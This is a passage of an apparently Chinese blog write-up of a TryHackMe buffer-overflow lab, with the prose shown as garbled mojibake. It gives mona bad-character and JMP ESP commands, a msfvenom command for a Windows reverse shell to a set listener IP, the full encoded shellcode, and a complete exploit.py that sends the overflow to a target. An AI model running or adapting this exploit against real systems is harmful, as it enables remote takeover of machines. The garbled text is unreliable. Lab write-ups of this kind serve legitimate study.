æ˜¯æ ¼å¼è§„èŒƒçš„ä¸€éƒ¨åˆ†ï¼Œè¡¨ç¤ºå°†å€¼æ ¼å¼åŒ–ä¸ºåå…­è¿›åˆ¶æ•°ã€‚ å› æ­¤ï¼Œ`\"{:02x}\".format(x)`ä¸­çš„`x`è¡¨ç¤ºå°†æ•´æ•°`x`è½¬æ¢ä¸ºä¸¤ä½çš„åå…­è¿›åˆ¶æ•°ï¼Œå¦‚æœä¸è¶³ä¸¤ä½åˆ™ç”¨å‰å¯¼é›¶å¡«å……ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›ç¤ºä¾‹ï¼š - å½“`x`çš„å€¼ä¸º10æ—¶ï¼Œ`\"{:02x}\".format(x)`å°†ç”Ÿæˆå­—ç¬¦ä¸²`\"0a\"`ã€‚ - å½“`x`çš„å€¼ä¸º255æ—¶ï¼Œ`\"{:02x}\".format(x)`å°†ç”Ÿæˆå­—ç¬¦ä¸²`\"ff\"`ã€‚ åœ¨ç»™å®šç¤ºä¾‹ä»£ç ä¸­ï¼Œå¾ªç¯è¿­ä»£çš„æ¯ä¸ªæ•´æ•°`x`éƒ½ä¼šé€šè¿‡`\"{:02x}\".format(x)`è¿›è¡Œæ ¼å¼åŒ–ï¼Œç”Ÿæˆå¯¹åº”çš„ä¸¤ä½åå…­è¿›åˆ¶æ•°çš„å­—ç¬¦ä¸²è¡¨ç¤ºã€‚è¿™äº›å­—ç¬¦ä¸²å°†è¢«æ‹¼æ¥å¹¶æ‰“å°å‡ºæ¥ï¼Œå½¢æˆä»1åˆ°255çš„æ‰€æœ‰å­—èŠ‚çš„åå…­è¿›åˆ¶è½¬ä¹‰åºåˆ—ã€‚ æ›´æ–°æ‚¨çš„exploit.py è„šæœ¬å¹¶å°†payload å˜é‡è®¾ç½®ä¸ºè„šæœ¬ç”Ÿæˆçš„åå­—ç¬¦å­—ç¬¦ä¸²ã€‚ \\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff é‡æ–°å¯åŠ¨Immunityä¸­çš„oscp.exeå¹¶å†æ¬¡è¿è¡Œä¿®æ”¹åçš„exploit.pyè„šæœ¬ã€‚è®°ä¸‹ ESP å¯„å­˜å™¨æŒ‡å‘çš„åœ°å€ï¼Œå¹¶åœ¨ä»¥ä¸‹ mona å‘½ä»¤ä¸­ä½¿ç”¨å®ƒï¼š å¾—åˆ°ESPåœ°å€ !mona compare -f C:\\mona\\p%\\bytearray.bin -a 019FFA30 åº”å‡ºç°ä¸€ä¸ªå¼¹å‡ºçª—å£ï¼Œæ ‡æœ‰â€œmona å†…å­˜æ¯”è¾ƒç»“æœâ€ã€‚å¦‚æœæ²¡æœ‰ï¼Œè¯·ä½¿ç”¨â€œçª—å£â€èœå•åˆ‡æ¢åˆ°å®ƒã€‚è¯¥çª—å£æ˜¾ç¤ºæ¯”è¾ƒç»“æœï¼ŒæŒ‡ç¤ºå†…å­˜ä¸­ä¸ç”Ÿæˆçš„ bytearray.bin æ–‡ä»¶ä¸­çš„å­—ç¬¦ä¸åŒçš„ä»»ä½•å­—ç¬¦ã€‚å¹¶éæ‰€æœ‰è¿™äº›éƒ½å¯èƒ½æ˜¯åå­—ç¬¦ï¼æœ‰æ—¶ï¼Œåå­—ç¬¦ä¹Ÿä¼šå¯¼è‡´ä¸‹ä¸€ä¸ªå­—èŠ‚è¢«æŸåï¼Œç”šè‡³å½±å“å­—ç¬¦ä¸²çš„å…¶ä½™éƒ¨åˆ†ã€‚ å¯ä»¥çœ‹åˆ°ä¸Šå›¾çš„ç»“æœè¿”å›äº†ä¸€ä¸ªbad charsï¼š07 08 2e 2f a0 a1 åˆ—è¡¨ä¸­çš„ç¬¬ä¸€ä¸ª badchar åº”è¯¥æ˜¯ç©ºå­—èŠ‚ (\\x00)ï¼Œå› ä¸ºæˆ‘ä»¬å·²ç»ä»æ–‡ä»¶ä¸­åˆ é™¤äº†å®ƒã€‚è®°ä¸‹ä»»ä½•å…¶ä»–å†…å®¹ã€‚åœ¨ mona ä¸­ç”Ÿæˆä¸€ä¸ªæ–°çš„å­—èŠ‚æ•°ç»„ï¼Œå¹¶æŒ‡å®šè¿™äº›æ–°çš„ badchars å’Œ \\x00ã€‚ç„¶åæ›´æ–°exploit.py è„šæœ¬ä¸­çš„payload å˜é‡å¹¶åˆ é™¤æ–°çš„badcharsã€‚ é‡æ–°å¯åŠ¨Immunityä¸­çš„oscp.exeå¹¶å†æ¬¡è¿è¡Œä¿®æ”¹åçš„exploit.pyè„šæœ¬ã€‚é‡å¤ badchar æ¯”è¾ƒï¼Œç›´åˆ°ç»“æœçŠ¶æ€è¿”å›â€œæœªä¿®æ”¹â€ã€‚è¿™è¡¨æ˜ä¸å†å­˜åœ¨ badcharsã€‚ æ ¹æ®æ–‡ç« æ‰€è¯´ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥å°±æ˜¯åˆ é™¤bad charsï¼Œå…ˆè¾“å…¥å¦‚ä¸‹å‘½ä»¤ !mona bytearray -b \"\\x00\\x07\\x08\\x2e\\x2f\\xa0\\xa1\" å¦‚ä¸Šå›¾å°±æ˜¯æˆ‘ä»¬å¾—åˆ°çš„æ–°çš„payloadï¼Œå°†å…¶æ›´æ–°åˆ°exploit.pyä¸­ï¼Œå†æ¬¡é‡æ–°è¿è¡Œoscp.exeï¼Œæ‰§è¡Œpyè„šæœ¬ è®°ä¸‹ä¸Šå›¾çš„ESPåœ°å€ï¼š01A3FA30ï¼Œæ¥ç€æ ¹æ®è¯¥åœ°å€ç»§ç»­é‡å¤badcharæ¯”è¾ƒï¼Œç›´åˆ°ç»“æœçŠ¶æ€è¿”å›â€œæœªä¿®æ”¹â€ã€‚è¿™è¡¨æ˜ä¸å†å­˜åœ¨ badcharsã€‚ !mona compare -f C:\\mona\\p%\\bytearray.bin -a 01A3FA30 Finding a Jump Point åœ¨ oscp.exe è¿è¡Œæˆ–å´©æºƒçŠ¶æ€ä¸‹ï¼Œè¿è¡Œä»¥ä¸‹ mona å‘½ä»¤ï¼Œç¡®ä¿ä½¿ç”¨æ‚¨è¯†åˆ«çš„æ‰€æœ‰é”™è¯¯å­—ç¬¦ï¼ˆåŒ…æ‹¬ \\x00ï¼‰æ›´æ–° -cpb é€‰é¡¹ï¼š !mona jmp -r esp -cpb \"\\x00\\x07\\x08\\x2e\\x2f\\xa0\\xa1\" æ­¤å‘½ä»¤æŸ¥æ‰¾åœ°å€ä¸åŒ…å«ä»»ä½•æŒ‡å®šçš„ badchars çš„æ‰€æœ‰â€œjmp espâ€ï¼ˆæˆ–ç­‰æ•ˆï¼‰æŒ‡ä»¤ã€‚ç»“æœåº”æ˜¾ç¤ºåœ¨â€œæ—¥å¿—æ•°æ®â€çª—å£ä¸­ï¼ˆå¦‚æœéœ€è¦ï¼Œè¯·ä½¿ç”¨â€œçª—å£â€èœå•åˆ‡æ¢åˆ°è¯¥çª—å£ï¼‰ã€‚ å¯ä»¥çœ‹åˆ°è¿™é‡Œæ‰¾åˆ°9ä¸ªJMP ESPåœ°å€ã€‚ é€‰æ‹©ä¸€ä¸ªåœ°å€å¹¶æ›´æ–°æ‚¨çš„exploit.py è„šæœ¬ï¼Œå°†â€œretnâ€å˜é‡è®¾ç½®ä¸ºå‘åå†™å…¥çš„åœ°å€ï¼ˆå› ä¸ºç³»ç»Ÿæ˜¯å°ç«¯ï¼‰ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå…ç–«ä¸­çš„åœ°å€ä¸º \\x01\\x02\\x03\\x04ï¼Œåˆ™åœ¨æ¼æ´åˆ©ç”¨ä¸­å°†å…¶å†™ä¸º \\x04\\x03\\x02\\x01ã€‚ è¿™é‡Œæˆ‘é€‰æ‹©ç¬¬ä¸€ä¸ªï¼š 0x625011af=ã€‹\\xaf\\x11\\x50\\x62 Generate Payload åœ¨ Kali ä¸Šè¿è¡Œä»¥ä¸‹ msfvenom å‘½ä»¤ï¼Œä½¿ç”¨æ‚¨çš„ Kali VPN IP ä½œä¸º LHOST å¹¶ä½¿ç”¨æ‚¨è¯†åˆ«çš„æ‰€æœ‰ badcharsï¼ˆåŒ…æ‹¬ \\x00ï¼‰æ›´æ–° -b é€‰é¡¹ï¼š msfvenom -p windows/shell_reverse_tcp LHOST=10.14.79.125 LPORT=5555 EXITFUNC=thread -b \"\\x00\\x07\\x08\\x2e\\x2f\\xa0\\xa1\" -f c //æ›´æ­£ä¹‹å msfvenom -p windows/shell_reverse_tcp LHOST=10.14.79.125 LPORT=5555 EXITFUNC=thread -b \"\\x00\\x07\\x2e\\xa0\" -f c æœ‰æ•ˆè´Ÿè½½éœ€è¦ EXITFUNC=thread æ‰èƒ½å·¥ä½œã€‚ EXITFUNC é€‰é¡¹æœ‰æ•ˆåœ°åœ¨æœ‰æ•ˆè´Ÿè½½ä¸­è®¾ç½®å‡½æ•°å“ˆå¸Œï¼ŒæŒ‡å®šæœ‰æ•ˆè´Ÿè½½å®Œæˆæ—¶è¦è°ƒç”¨çš„ DLL å’Œå‡½æ•°ã€‚ THREAD ç”¨äºå¤§å¤šæ•°åˆ©ç”¨åœºæ™¯ï¼Œå…¶ä¸­è¢«åˆ©ç”¨çš„è¿›ç¨‹ï¼ˆä¾‹å¦‚ IEï¼‰åœ¨å­çº¿ç¨‹ä¸­è¿è¡Œ shellcodeï¼Œé€€å‡ºè¯¥çº¿ç¨‹ä¼šå¯¼è‡´åº”ç”¨ç¨‹åº/ç³»ç»Ÿå·¥ä½œï¼ˆå¹²å‡€é€€å‡ºï¼‰ å¤åˆ¶ç”Ÿæˆçš„ C ä»£ç å­—ç¬¦ä¸²ï¼Œå¹¶ä½¿ç”¨ä»¥ä¸‹è¡¨ç¤ºæ³•å°†å®ƒä»¬é›†æˆåˆ°æ‚¨çš„exploit.py è„šæœ¬æœ‰æ•ˆè´Ÿè½½å˜é‡ä¸­ï¼š payload = (\"\\xda\\xdb\\xb8\\x82\\xb7\\xc3\\xe6\\xd9\\x74\\x24\\xf4\\x5d\\x2b\\xc9\" \"\\xb1\\x52\\x83\\xed\\xfc\\x31\\x45\\x13\\x03\\xc7\\xa4\\x21\\x13\\x3b\" \"\\x22\\x27\\xdc\\xc3\\xb3\\x48\\x54\\x26\\x82\\x48\\x02\\x23\\xb5\\x78\" \"\\x40\\x61\\x3a\\xf2\\x04\\x91\\xc9\\x76\\x81\\x96\\x7a\\x3c\\xf7\\x99\" \"\\x7b\\x6d\\xcb\\xb8\\xff\\x6c\\x18\\x1a\\xc1\\xbe\\x6d\\x5b\\x06\\xa2\" \"\\x9c\\x09\\xdf\\xa8\\x33\\xbd\\x54\\xe4\\x8f\\x36\\x26\\xe8\\x97\\xab\" \"\\xff\\x0b\\xb9\\x7a\\x8b\\x55\\x19\\x7d\\x58\\xee\\x10\\x65\\xbd\\xcb\" \"\\xeb\\x1e\\x75\\xa7\\xed\\xf6\\x47\\x48\\x41\\x37\\x68\\xbb\\x9b\\x70\" \"\\x4f\\x24\\xee\\x88\\xb3\\xd9\\xe9\\x4f\\xc9\\x05\\x7f\\x4b\\x69\\xcd\" \"\\x27\\xb7\\x8b\\x02\\xb1\\x3c\\x87\\xef\\xb5\\x1a\\x84\\xee\\x1a\\x11\" \"\\xb0\\x7b\\x9d\\xf5\\x30\\x3f\\xba\\xd1\\x19\\x9b\\xa3\\x40\\xc4\\x4a\" \"\\xdb\\x92\\xa7\\x33\\x79\\xd9\\x4a\\x27\\xf0\\x80\\x02\\x84\\x39\\x3a\" \"\\xd3\\x82\\x4a\\x49\\xe1\\x0d\\xe1\\xc5\\x49\\xc5\\x2f\\x12\\xad\\xfc\" \"\\x88\\x8c\\x50\\xff\\xe8\\x85\\x96\\xab\\xb8\\xbd\\x3f\\xd4\\x52\\x3d\" \"\\xbf\\x01\\xf4\\x6d\\x6f\\xfa\\xb5\\xdd\\xcf\\xaa\\x5d\\x37\\xc0\\x95\" \"\\x7e\\x38\\x0a\\xbe\\x15\\xc3\\xdd\\xcb\\xe7\\x84\\x60\\xa4\\xf5\\x1a\" \"\\x8e\\x87\\x73\\xfc\\xda\\xf7\\xd5\\x57\\x73\\x61\\x7c\\x23\\xe2\\x6e\" \"\\xaa\\x4e\\x24\\xe4\\x59\\xaf\\xeb\\x0d\\x17\\xa3\\x9c\\xfd\\x62\\x99\" \"\\x0b\\x01\\x59\\xb5\\xd0\\x90\\x06\\x45\\x9e\\x88\\x90\\x12\\xf7\\x7f\" \"\\xe9\\xf6\\xe5\\x26\\x43\\xe4\\xf7\\xbf\\xac\\xac\\x23\\x7c\\x32\\x2d\" \"\\xa1\\x38\\x10\\x3d\\x7f\\xc0\\x1c\\x69\\x2f\\x97\\xca\\xc7\\x89\\x41\" \"\\xbd\\xb1\\x43\\x3d\\x17\\x55\\x15\\x0d\\xa8\\x23\\x1a\\x58\\x5e\\xcb\" \"\\xab\\x35\\x27\\xf4\\x04\\xd2\\xaf\\x8d\\x78\\x42\\x4f\\x44\\x39\\x62\" \"\\xb2\\x4c\\x34\\x0b\\x6b\\x05\\xf5\\x56\\x8c\\xf0\\x3a\\x6f\\x0f\\xf0\" \"\\xc2\\x94\\x0f\\x71\\xc6\\xd1\\x97\\x6a\\xba\\x4a\\x72\\x8c\\x69\\x6a\" \"\\x57\") Prepend NOPs å‰ç½® NOP ç”±äºç¼–ç å™¨å¯èƒ½ç”¨äºç”Ÿæˆæœ‰æ•ˆè´Ÿè½½ï¼Œå› æ­¤æ‚¨å°†éœ€è¦ä¸€äº›å†…å­˜ç©ºé—´æ¥è®©æœ‰æ•ˆè´Ÿè½½è‡ªè¡Œè§£åŒ…ã€‚æ‚¨å¯ä»¥é€šè¿‡å°†å¡«å……å˜é‡è®¾ç½®ä¸º 16 æˆ–æ›´å¤šâ€œæ— æ“ä½œâ€(\\x90) å­—èŠ‚çš„å­—ç¬¦ä¸²æ¥å®Œæˆæ­¤æ“ä½œï¼š Exlpoit é€šè¿‡æ­£ç¡®çš„å‰ç¼€ã€åç§»é‡ã€è¿”å›åœ°å€ã€å¡«å……å’Œæœ‰æ•ˆè´Ÿè½½è®¾ç½®ï¼Œæ‚¨ç°åœ¨å¯ä»¥åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºæ¥è·å–åå‘ shellã€‚ä½¿ç”¨æ‚¨åœ¨ msfvenom å‘½ä»¤ä¸­æŒ‡å®šçš„ LPORTï¼ˆå¦‚æœæ‚¨æ²¡æœ‰æ›´æ”¹å®ƒï¼Œåˆ™ä¸º 4444ï¼‰åœ¨ Kali ç›’å­ä¸Šå¯åŠ¨ netcat ä¾¦å¬å™¨ã€‚é‡æ–°å¯åŠ¨Immunityä¸­çš„oscp.exeå¹¶å†æ¬¡è¿è¡Œä¿®æ”¹åçš„exploit.pyè„šæœ¬ã€‚æ‚¨çš„ netcat ä¾¦å¬å™¨åº”è¯¥æ•è·åå‘ shellï¼ import socket ip = \"10.10.116.15\" port = 1337 prefix = \"OVERFLOW1 \" offset = 1978 overflow = \"A\" * offset retn = \"\\xaf\\x11\\x50\\x62\" payload = (\"\\xda\\xdb\\xb8\\x82\\xb7\\xc3\\xe6\\xd9\\x74\\x24\\xf4\\x5d\\x2b\\xc9\" \"\\xb1\\x52\\x83\\xed\\xfc\\x31\\x45\\x13\\x03\\xc7\\xa4\\x21\\x13\\x3b\" \"\\x22\\x27\\xdc\\xc3\\xb3\\x48\\x54\\x26\\x82\\x48\\x02\\x23\\xb5\\x78\" \"\\x40\\x61\\x3a\\xf2\\x04\\x91\\xc9\\x76\\x81\\x96\\x7a\\x3c\\xf7\\x99\" \"\\x7b\\x6d\\xcb\\xb8\\xff\\x6c\\x18\\x1a\\xc1\\xbe\\x6d\\x5b\\x06\\xa2\" \"\\x9c\\x09\\xdf\\xa8\\x33\\xbd\\x54\\xe4\\x8f\\x36\\x26\\xe8\\x97\\xab\" \"\\xff\\x0b\\xb9\\x7a\\x8b\\x55\\x19\\x7d\\x58\\xee\\x10\\x65\\xbd\\xcb\" \"\\xeb\\x1e\\x75\\xa7\\xed\\xf6\\x47\\x48\\x41\\x37\\x68\\xbb\\x9b\\x70\" \"\\x4f\\x24\\xee\\x88\\xb3\\xd9\\xe9\\x4f\\xc9\\x05\\x7f\\x4b\\x69\\xcd\" \"\\x27\\xb7\\x8b\\x02\\xb1\\x3c\\x87\\xef\\xb5\\x1a\\x84\\xee\\x1a\\x11\" \"\\xb0\\x7b\\x9d\\xf5\\x30\\x3f\\xba\\xd1\\x19\\x9b\\xa3\\x40\\xc4\\x4a\" \"\\xdb\\x92\\xa7\\x33\\x79\\xd9\\x4a\\x27\\xf0\\x80\\x02\\x84\\x39\\x3a\" \"\\xd3\\x82\\x4a\\x49\\xe1\\x0d\\xe1\\xc5\\x49\\xc5\\x2f\\x12\\xad\\xfc\" \"\\x88\\x8c\\x50\\xff\\xe8\\x85\\x96\\xab\\xb8\\xbd\\x3f\\xd4\\x52\\x3d\" \"\\xbf\\x01\\xf4\\x6d\\x6f\\xfa\\xb5\\xdd\\xcf\\xaa\\x5d\\x37\\xc0\\x95\" \"\\x7e\\x38\\x0a\\xbe\\x15\\xc3\\xdd\\xcb\\xe7\\x84\\x60\\xa4\\xf5\\x1a\" \"\\x8e\\x87\\x73\\xfc\\xda\\xf7\\xd5\\x57\\x73\\x61\\x7c\\x23\\xe2\\x6e\" \"\\xaa\\x4e\\x24\\xe4\\x59\\xaf\\xeb\\x0d\\x17\\xa3\\x9c\\xfd\\x62\\x99\" \"\\x0b\\x01\\x59\\xb5\\xd0\\x90\\x06\\x45\\x9e\\x88\\x90\\x12\\xf7\\x7f\" \"\\xe9\\xf6\\xe5\\x26\\x43\\xe4\\xf7\\xbf\\xac\\xac\\x23\\x7c\\x32\\x2d\" \"\\xa1\\x38\\x10\\x3d\\x7f\\xc0\\x1c\\x69\\x2f\\x97\\xca\\xc7\\x89\\x41\" \"\\xbd\\xb1\\x43\\x3d\\x17\\x55\\x15\\x0d\\xa8\\x23\\x1a\\x58\\x5e\\xcb\" \"\\xab\\x35\\x27\\xf4\\x04\\xd2\\xaf\\x8d\\x78\\x42\\x4f\\x44\\x39\\x62\" \"\\xb2\\x4c\\x34\\x0b\\x6b\\x05\\xf5\\x56\\x8c\\xf0\\x3a\\x6f\\x0f\\xf0\" \"\\xc2\\x94\\x0f\\x71\\xc6\\xd1\\x97\\x6a\\xba\\x4a\\x72\\x8c\\x69\\x6a\" \"\\x57\") padding = \"\\x90\" * 32 postfix = \"\" payloadfer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\"Sending evil payloadfer....\") s.send(bytes(payloadfer + \"\\r \", \"latin-1\")) print(\"Done!\") except: print(\"Could not connect.\") åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å°±è¦é‡æ–°è¿è¡Œoscp.exeï¼Œä¹‹åè¿è¡Œè¯¥è„šæœ¬ï¼ˆåŒæ—¶å¯åŠ¨ç›‘å¬ï¼‰ï¼Œæœ€åå°†ä¼šæ‹¿åˆ°shell å­¦ä¹ é—®é¢˜ é—®é¢˜ä¸€ ç¯å¢ƒå¿«æ²¡äº†ï¼Œå…ˆè§£å†³ä¸€ä¸‹è¿™ä¸ªbadcharsé—®é¢˜ï¼Œçœ‹äº†å‡ ç¯‡æ–‡ç« ï¼Œå°±è¿™ä¸€ç¯‡ï¼špayloadfer Overflow Prep Walkthrough è¿™æä¾›äº†æˆ‘ä¸€ä¸ªæ€è·¯ï¼Œåœ¨å¯»æ‰¾çœŸæ­£çš„badcharsçš„æ—¶å€™ï¼Œæ¯”å¦‚ä¸Šé¢çš„ä¾‹å­æˆ‘ä»¬åˆšå¼€å§‹æ˜¯ï¼š\\x00\\x07\\x08\\x2e\\x2f\\xa0\\xa1 å‡­å€Ÿtryhackmeçš„æç¤ºï¼šå¹¶éæ‰€æœ‰è¿™äº›éƒ½å¯èƒ½æ˜¯åå­—ç¬¦ï¼æœ‰æ—¶ï¼Œåå­—ç¬¦ä¹Ÿä¼šå¯¼è‡´ä¸‹ä¸€ä¸ªå­—èŠ‚è¢«æŸåï¼Œç”šè‡³å½±å“å­—ç¬¦ä¸²çš„å…¶ä½™éƒ¨åˆ†ã€‚ æˆ‘ä»¬å¯ä»¥å…ˆåˆ é™¤\\x07ï¼Œçœ‹å›æ˜¾ï¼Œåœ¨ä¸Šè¿°ä¾‹å­ä¸­ï¼Œå½“æˆ‘ä»¬åˆ é™¤ä¹‹åï¼Œå›æ˜¾å°±æ˜¯badcharsï¼š\\x2e\\x2f\\xa0\\xa1ï¼Œè¿™æ„å‘³ç€07å¿…ç„¶æ˜¯badcharï¼Œå› æ­¤æ‰å½±å“äº†08æˆä¸ºbadcharï¼›é‚£æ¥ä¸‹æ¥ç»§ç»­åˆ é™¤2eï¼Œå‘ç°å›æ˜¾badcharsï¼š\\xa0\\xa1ï¼Œæ„å‘³ç€2eæ˜¯badcharï¼Œæ¥ä¸‹æ¥å°±åŒç†äº†ï¼Œä¸èµ˜è¿°äº†ã€‚ç”±æ­¤æˆ‘ä»¬å¯ä»¥ç¡®å®šæœ€ç»ˆçš„badcharsï¼š\\x07\\0x2e\\xa0 â€”â€”æœ€åçš„è¯ï¼Œä¼šæ˜¾ç¤ºbadcharsä¸ºç©ºï¼Œè¯æ˜æ‰¾å®Œäº†ã€‚ é—®é¢˜äºŒ è·Ÿç€ç½‘ä¸Šè§†é¢‘ä»¥åŠæ–‡ç« ï¼Œåˆæ­¥ç†è§£äº†ç¼“å†²åŒºæº¢å‡ºæ¼æ´çš„åŸç†ä»¥åŠåˆ©ç”¨æ€è·¯æ–¹æ³•ï¼Œæµ…æµ…æ€»ç»“ä¸€ä¸‹ï¼š é¦–å…ˆå°±æ˜¯å¯¹ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼Œæ¯”å¦‚ä¸Šé¢çš„exeæ–‡ä»¶ï¼Œå…¶ä¸­å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œæ¯”å¦‚æˆ‘ä»¬å€Ÿé‰´ä¸€ä¸ªä¾‹å­ #include \"stdio.h\" #include \"string.h\" //20ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬å°†æ•°æ®é‡åŠ ä¸€å€ char name[]=\"qianyishenqianyishen\"; int main(){ //ç”³è¯·äº†11ä¸ªå­—èŠ‚çš„ç©ºé—´ char payloadfer[11]; //å°†å˜é‡nameä¸­çš„å†…å®¹å¤åˆ¶åˆ°payloadferæ•°ç»„ä¸­ï¼ˆç”±äºpayloadferç”³è¯·çš„ç©ºé—´ &lt; 20å­—èŠ‚ï¼Œæ‰€ä»¥ä¼šå‘ç”Ÿæº¢å‡ºï¼‰ strcpy(payloadfer,name); printf(\"%s \",payloadfer); //åŠ ä¸Šè¿™è¡Œä»£ç å¯ä»¥ä½¿ç¨‹åºæ‰§è¡Œå®Œprintfä¹‹ååœæ­¢ï¼Œæˆ‘ä»¬å›è½¦æ‰å¯ä»¥ç»§ç»­æ‰§è¡Œï¼Œä»¥ä¾¿æˆ‘ä»¬æŸ¥çœ‹æ‰§è¡Œç»“æœ getchar(); return 0; } è¿™é‡Œæˆ‘ä»¬ç»™æ•°ç»„ç”³è¯·äº†11ä¸ªå­—èŠ‚ç©ºé—´ï¼Œä½†æ˜¯nameæ•°ç»„èµ‹å€¼å´å¤§äº11ï¼Œé‚£å½“strcpyå‡½æ•°è°ƒç”¨çš„æ—¶å€™ï¼Œå°±ä¼šå­˜åœ¨æº¢å‡ºçš„æƒ…å†µï¼Œpayloadferæ•°ç»„æ˜æ˜¾æ”¾ä¸ä¸‹nameã€‚ å¯¹äºæ­¤ç§æƒ…å†µï¼Œæˆ‘ä»¬å…ˆæ˜ç¡®ä¸€ä¸‹æ”»å‡»æ€è·¯ï¼ˆå¯¹äºç›®å‰çš„è¾ƒä¸ºä½çº§çš„åˆ©ç”¨æ–¹å¼ï¼‰ï¼Œè¿™é‡Œè¿˜æ˜¯å…ˆè·Ÿç€PWNçš„æœ¯è¯­æ¥é˜è¿°å§ï¼š å®éªŒè¿‡ç¨‹å¤§è‡´å¦‚ä¸‹ï¼š ç²¾ç¡®å®šä½è¿”å›åœ°å€çš„ä½ç½® å¯»æ‰¾ä¸€ä¸ªåˆé€‚çš„åœ°å€ï¼Œç”¨äºè¦†ç›–åŸå§‹åœ°å€ ç¼–å†™shellcodeåˆ°ç›¸åº”çš„ç¼“å†²åŒºä¸­ å®éªŒæ€è·¯ï¼š åˆ©ç”¨é”™è¯¯æç¤ºå¯¹è¯æ¡†æ¥å®šä½è¿”å›åœ°å€çš„ä½ç½® ç†è§£jmp espçš„å®ç°åŸç† è¿™é‡Œç¬¬ä¸€æ­¥è·Ÿtryhackmeçš„æœ‰é”™å‡ºå…¥ï¼Œtryhackmeä¼¼ä¹å†å¼ºè°ƒå¯»æ‰¾æ­£ç¡®EIPçš„åœ°å€ï¼Œæˆ‘ä»¬çŸ¥é“EIPä»£è¡¨çš„æ˜¯ï¼šEIPæ˜¯x86ä½“ç³»ç»“æ„ä¸­çš„ä¸€ä¸ªå¯„å­˜å™¨ï¼Œå®ƒå­˜å‚¨ç€ä¸‹ä¸€æ¡å°†è¦æ‰§è¡Œçš„æŒ‡ä»¤çš„å†…å­˜åœ°å€ã€‚å®ƒåœ¨ç¨‹åºæ‰§è¡ŒæœŸé—´ä¸æ–­æ›´æ–°ï¼ŒæŒ‡å‘å³å°†æ‰§è¡Œçš„æŒ‡ä»¤ã€‚ ä¸è®ºå¦‚ä½•ï¼Œæˆ‘ä»¬å…ˆä»PWNæ€è·¯ç†ä¸€éï¼Œå½“æˆ‘ä»¬è¿è¡Œè¿™ä¸ªç¼ºé™·ç¨‹åºçš„æ—¶å€™ï¼Œå¿…ç„¶ä¼šé”™è¯¯ï¼Œå› ä¸ºæº¢å‡ºçš„æ•°æ®å°†æˆ‘ä»¬çš„è¿”å›åœ°å€è¦†ç›–æ‰äº†ï¼Œé‚£è¯¥é”™è¯¯æ‰€è¿”å›çš„åœ°å€å°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„å‡†ç¡®åœ°å€ï¼Œä¹Ÿå¯ä»¥è¯´å°±æ˜¯æˆ‘ä»¬æƒ³è¦ç²¾å¿ƒæ„é€ çš„åœ°å€ä½ç½®ã€‚ å¾—åˆ°è¿™ä¸ªåœ°å€ä½ç½®ä¹‹åï¼Œæˆ‘ä»¬è‚¯å®šæƒ³è¦ç¼–å†™shellcodeä»¥è¢«è¯¥ç¨‹åºæ‰§è¡Œï¼Œé‚£è¯¥shellcodeæ‰€åœ¨åœ°å€ä¸€å®šè¦åˆæ³•ï¼Œä¸ç„¶ç¨‹åºåªä¼šæŠ±é”™ã€‚é‚£å¯¹äºæˆ‘ä»¬æƒ³è¦ç²¾å¿ƒæ„é€ çš„åˆæ³•åœ°å€ï¼Œå¿…ç„¶ä¸æ˜¯å‡­ç©ºæé€ çš„ï¼Œæˆ‘ä»¬è¯¥å¦‚ä½•è®¾è®¡å‘¢ã€‚æ ¹æ®æ–‡ç« æ‰€è¯´ï¼Œæ–¹æ³•ä¸ºç»å…¸jmp espæ–¹æ³•ï¼š ä¹Ÿå°±æ˜¯è¯´ï¼Œåˆ©ç”¨espè¿™ä¸ªè·³æ¿è¿›è¡Œè·³è½¬ã€‚ è¿™é‡Œçš„è¿™ä¸ªè·³æ¿æ˜¯æŒ‡ç¨‹åºä¸­åŸæœ‰çš„æœºå™¨ä»£ç 